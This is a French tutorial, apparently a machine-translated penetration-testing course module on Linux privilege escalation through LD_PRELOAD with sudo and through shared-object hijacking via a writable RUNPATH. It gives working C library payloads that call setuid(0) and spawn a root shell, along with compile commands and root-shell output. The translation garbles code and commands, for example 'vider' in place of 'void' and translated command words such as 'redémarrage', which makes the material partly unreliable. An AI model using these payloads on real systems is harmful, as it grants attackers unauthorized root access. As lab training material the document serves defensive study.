Bibliothèques partagées
================

* * * * *

Il est courant que les programmes Linux utilisent des bibliothèques d'objets partagés liés dynamiquement. Les bibliothèques contiennent du code compilé ou d'autres données que les développeurs utilisent pour éviter d'avoir à réécrire les mêmes morceaux de code dans plusieurs programmes. Deux types de bibliothèques existent sous Linux : les `bibliothèques statiques` (désignées par l'extension de fichier .a) et les `bibliothèques d'objets partagés liées dynamiquement` (désignées par l'extension de fichier .so). Lorsqu'un programme est compilé, les bibliothèques statiques font partie du programme et ne peuvent pas être modifiées. Cependant, les bibliothèques dynamiques peuvent être modifiées pour contrôler l'exécution du programme qui les appelle.

Il existe plusieurs méthodes pour spécifier l'emplacement des bibliothèques dynamiques, afin que le système sache où les rechercher lors de l'exécution du programme. Cela inclut les indicateurs `-rpath` ou `-rpath-link` lors de la compilation d'un programme, en utilisant les variables d'environnement `LD_RUN_PATH` ou `LD_LIBRARY_PATH`, en plaçant les bibliothèques dans les répertoires `/lib` ou `/usr/lib` par défaut, ou en spécifiant un autre répertoire contenant les bibliothèques dans le fichier de configuration `/etc/ld.so.conf` .

De plus, la variable d'environnement `LD_PRELOAD` peut charger une bibliothèque avant d'exécuter un binaire. Les fonctions de cette bibliothèque sont privilégiées par rapport à celles par défaut. Les objets partagés requis par un binaire peuvent être visualisés à l'aide de l'utilitaire `ldd`.

```
htb_student@NIX02 :~$ ldd /bin/ls

linux-vdso.so.1 => (0x00007fff03bc7000)
libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)

```

L'image ci-dessus répertorie toutes les bibliothèques requises par `/bin/ls`, ainsi que leurs chemins absolus.

* * * * *

LD_PRELOAD Élévation des privilèges
-------------------------------

Voyons un exemple de la façon dont nous pouvons utiliser la variable d'environnement [LD_PRELOAD](https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) pour augmenter les privilèges. Pour cela, nous avons besoin d'un utilisateur avec les privilèges `sudo` .

```
htb_student@NIX02 :~$ sudo -l

Entrées correspondantes par défaut pour daniel.carter sur NIX02 :
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

L'utilisateur daniel.carter peut exécuter les commandes suivantes sur NIX02 :
     (racine) NOPASSWD : redémarrage de /usr/sbin/apache2

```

Cet utilisateur a le droit de redémarrer le service Apache en tant qu'utilisateur root, mais étant donné qu'il ne s'agit PAS d'un [GTFOBin](https://gtfobins.github.io/#apache) et que l'entrée `/etc/sudoers` est écrite en spécifiant le chemin absolu, cela ne peut pas être utilisé pour augmenter les privilèges dans des circonstances normales. Cependant, nous pouvons exploiter le problème `LD_PRELOAD` pour exécuter un fichier de bibliothèque partagé personnalisé. Compilons la bibliothèque suivante :

Code : c

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

```

Nous pouvons compiler ceci comme suit :

```
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles

```

Enfin, nous pouvons augmenter les privilèges à l'aide de la commande ci-dessous. Assurez-vous de spécifier le chemin d'accès complet à votre fichier de bibliothèque malveillant.

```
htb_student@NIX02 :~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 redémarrage

identifiant
uid=0(root) gid=0(root) groupes=0(root)

```

Détournement d'objets partagés
=======================

* * * * *

Les programmes et les binaires en cours de développement sont généralement associés à des bibliothèques personnalisées. Considérez le binaire `SETUID` suivant.

```
htb_student@NIX02:~$ ls -la paie

-rwsr-xr-x 1 racine racine 16728 1 sept. 22:05 paie

```

Nous pouvons utiliser [ldd](https://manpages.ubuntu.com/manpages/bionic/man1/ldd.1.html) pour imprimer l'objet partagé requis par un objet binaire ou partagé. `Ldd` affiche l'emplacement de l'objet et l'adresse hexadécimale où il est chargé en mémoire pour chacune des dépendances d'un programme.

```
htb_student@NIX02 :~ $ ldd paie

linux-vdso.so.1 => (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)

```

Nous voyons une bibliothèque non standard nommée `libshared.so` répertoriée comme une dépendance pour le binaire. Comme indiqué précédemment, il est possible de charger des bibliothèques partagées à partir d'emplacements personnalisés. L'un de ces paramètres est la configuration `RUNPATH` . Les bibliothèques de ce dossier ont la priorité sur les autres dossiers. Cela peut être inspecté à l'aide de l'utilitaire [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html).

```
htb_student@NIX02 :~$ readelf -d paie | grep CHEMIN

  0x000000000000001d (RUNPATH) Chemin d'exécution de la bibliothèque : [/development]

```

La configuration permet le chargement de bibliothèques à partir du dossier `/development` , accessible en écriture par tous les utilisateurs. Cette mauvaise configuration peut être exploitée en plaçant une bibliothèque malveillante dans `/development`, qui aura priorité sur les autres dossiers car les entrées de ce fichier sont vérifiées en premier (avant les autres dossiers présents dans les fichiers de configuration).

```
htb_student@NIX02 :~$ ls -la /development/

total 8
drwxrwxrwx 2 racine racine 4096 1er septembre 22:06 ./
drwxr-xr-x 23 racine racine 4096 1er septembre 21:26 ../

```

Avant de compiler une bibliothèque, nous devons trouver le nom de la fonction appelée par le binaire.

```
htb_student@NIX02 :~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

```

```
htb_student@NIX02 :~ $ ldd paie

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)

```

```
htb_student@NIX02 :~$ ./paie

./payroll : erreur de recherche de symbole : ./payroll : symbole non défini : dbquery

```

Nous pouvons copier une bibliothèque existante dans le dossier `development` . L'exécution `ldd` contre le binaire répertorie le chemin de la bibliothèque comme `/development/libshared.`so, ce qui signifie qu'il est vulnérable. L'exécution du binaire génère une erreur indiquant qu'il n'a pas réussi à trouver la fonction nommée `dbquery`. Nous pouvons compiler un objet partagé qui inclut cette fonction.

Code : c

```
#include<stdio.h>
#include<stdlib.h>

vider dbquery() {
     printf("Bibliothèque malveillante chargée\n");
     setuid(0);
     system("/bin/sh -p");
}

```

La fonction `dbquery` définit notre identifiant d'utilisateur sur 0 (racine) et exécute `/bin/sh` lorsqu'elle est appelée. Compilez-le en utilisant [GCC](https://linux.die.net/man/1/gcc).

```
htb_student@NIX02 :~$ gcc src.c -fPIC -shared -o /development/libshared.so

```

Exécuter à nouveau le binaire devrait afficher la bannière et ouvrir un shell racine.

```
htb_student@NIX02 :~$ ./paie

*************** Base de données des employés du fret intérieur ***************

Bibliothèque malveillante chargée
# identifiant
uid=0(root) gid=1000(mrb3n) groupes=1000(mrb3n)

```